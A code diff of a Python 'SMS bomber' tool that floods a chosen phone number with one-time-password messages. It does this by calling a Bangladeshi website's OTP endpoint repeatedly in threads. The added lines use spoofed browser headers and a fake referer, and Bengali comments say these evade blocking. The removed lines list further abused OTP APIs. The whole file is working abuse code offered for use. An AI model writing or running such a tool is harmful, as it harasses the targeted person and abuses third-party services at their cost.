@@ -1,11 +1,11 @@
 import os, time, threading, requests
 
+# --- Configuration ---
 PASSWORD = "takbir0099"
-
-# হেডার ব্যবহার করলে সার্ভার মনে করবে এটি আসল ব্রাউজার থেকে আসছে
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Content-Type': 'application/json'
+    'Accept': 'application/json',
+    'Referer': 'https://google.com'
 }
 
 def banner():
@@ -17,61 +17,58 @@ def banner():
      ██║   ██╔══██║██╔═██╗ ██╔══██╗██║██╔══██╗
      ██║   ██║  ██║██║  ██╗██████╔╝██║██║  ██╗
      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝
-             Takbir Ahmed / Easy-Bomb v4.0
+             Takbir Ahmed / PRO BOMBING v3.0
 \033[0m""")
 
 def password_prompt():
-    print("\033[1;31m[!] Password Protected Tool\033[0m")
-    if input("Enter Password: ") != PASSWORD:
+    print("\033[1;31m[!] Tool is locked.\033[0m")
+    if input("Password: ") != PASSWORD:
         print("Wrong!"); exit()
+    print("\033[1;32m[+] Access Granted!\033[0m")
 
-def update_counter(count):
-    print(f"\033[1;36m[+] SMS Sent Successfully: {count}\033[0m")
+counter = 0
+lock = threading.Lock()
+
+def update_counter():
+    global counter
+    with lock:
+        counter += 1
+        print(f"\033[1;36m[+ Sent Successfully] Total SMS: {counter}\033[0m")
+
+def send_request(url):
+    try:
+        # এখানে Headers ব্যবহার করা হয়েছে ব্লক এড়াতে
+        res = requests.get(url, headers=HEADERS, timeout=10)
+        if res.status_code == 200:
+            update_counter()
+    except:
+        pass
 
 def start():
     banner()
     password_prompt()
+    target = input("Target (01XXXXXXXXX): ")
+    if len(target) != 11: print("Invalid!"); return
     
-    number = input("\nTarget Number (01XXXXXXXXX): ")
-    if len(number) != 11:
-        print("Invalid Number!"); return
-        
-    amount = int(input("How many SMS?: "))
+    number = target
+    amount = int(input("Amount: "))
     
-    # এই API গুলো বর্তমানে ছোট সাইট হওয়ার কারণে সহজে ব্লক করে না
     api_list = [
-        # Fundesh (GET API)
-        f"https://fundesh.com.bd/api/auth/generateOTP?phone={number}",
-        # OsudPotro (POST API) - এটি অনেক ফাস্ট কাজ করে
-        "https://api.osudpotro.com/api/v1/users/send_otp",
-        # Medeasy (POST API)
-        "https://api.medeasy.health/api/v1/patient-auth/send-otp"
+        {"url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}", "method": "GET"},
     ]
 
     print("\n\033[1;33m[!] Bombing Started...\033[0m")
-    sent = 0
+    threads = []
     
-    for i in range(amount):
-        # API 1: Fundesh (GET)
-        try:
-            requests.get(api_list[0], headers=HEADERS, timeout=10)
-            sent += 1
-            update_counter(sent)
-        except: pass
+    for _ in range(amount):
+        for api in api_list:
+            t = threading.Thread(target=send_request, args=(api['url'],))
+            t.start()
+            threads.append(t)
+            time.sleep(0.2) # ওভারলোড এড়াতে সামান্য গ্যাপ
 
-        # API 2: OsudPotro (POST)
-        try:
-            requests.post(api_list[1], json={"phone": number}, headers=HEADERS, timeout=10)
-            sent += 1
-            update_counter(sent)
-        except: pass
-
-        # সার্ভার থেকে ব্লক হওয়া এড়াতে প্রতি সাইকেলের পর ২ সেকেন্ড বিরতি
-        time.sleep(2)
-        
-        if sent >= amount: break
-
-    print("\n\033[1;32m[✔] Task Finished!\033[0m")
+    for t in threads: t.join()
+    print("\n\033[1;32m[✔] All Requests Completed!\033[0m")
 
 if __name__ == "__main__":
     start()
